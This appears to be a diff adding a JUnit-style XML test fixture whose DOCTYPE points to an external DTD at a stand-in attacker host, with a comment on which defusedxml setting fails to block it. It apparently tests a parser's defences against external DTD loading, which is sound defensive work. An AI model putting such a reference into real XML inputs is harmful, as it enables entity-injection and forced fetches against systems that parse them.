@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- A DOCTYPE that declares no entities of its own. defusedxml's default
+     forbid_entities does not reject this; only forbid_dtd does. -->
+<!DOCTYPE testsuite SYSTEM "http://attacker.example/payload.dtd">
+<testsuite name="org.apache.camel.probe.HostileTest" tests="1" failures="0" flakes="1">
+  <testcase name="externalSubset" classname="org.apache.camel.probe.HostileTest">
+    <flakyFailure message="boom" type="java.lang.AssertionError"/>
+  </testcase>
+</testsuite>
